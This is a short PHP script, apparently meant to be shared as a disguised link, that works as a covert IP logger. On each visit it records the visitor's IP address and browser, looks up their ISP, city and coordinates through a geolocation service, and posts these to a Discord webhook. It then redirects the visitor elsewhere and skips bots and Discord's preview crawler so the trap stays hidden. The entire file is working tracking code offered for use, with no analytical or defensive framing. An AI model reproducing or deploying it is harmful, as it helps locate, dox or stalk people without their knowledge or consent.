<?php

//Get the IP & Info
$IP       = $_SERVER['REMOTE_ADDR'];
$Browser  = $_SERVER['HTTP_USER_AGENT'];

//Stop us from picking up bot ips
if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
    exit();
}

//Info
$Curl = curl_init("http://ip-api.com/json/$IP"); //Get the info of the IP using Curl
curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
$Info = json_decode(curl_exec($Curl)); 
curl_close($Curl);

$ISP = $Info->isp;
$Country = $Info->country;
$Region = $Info->regionName;
$City = $Info->city;
$COORD = "$Info->lat, $Info->lon"; // Coordinates

//Variables
$Webhook    = ""; //Webhook here.

$WebhookTag = "Showcase"; //This will be the name of the webhook when it sends a message.  

//JS we are going to send to the webhook.
$JS = array(
    'username'   => "$WebhookTag - IP Logger" , 
    'avatar_url' => "https://vgy.me/GQe9bJ.png",
    'content'    => "**__IP Info__**:\nIP: $IP\nISP: $ISP\nBrowser: $Browser\n**__Location__**: \nCountry: $Country\nRegion: $Region\nCity: $City\nCoordinates: $COORD"
);
 
//Encode that JS so we can post it to the webhook
$JSON = json_encode($JS);


function IpToWebhook($Hook, $Content)
{
    //Use Curl to post to the webhook.
      $Curl = curl_init($Hook);
      curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
      curl_setopt($Curl, CURLOPT_POSTFIELDS, $Content);
      curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
      return curl_exec($Curl);
}

IpToWebhook($Webhook, $JSON);
header("Location: https://www.littest.site");
?>
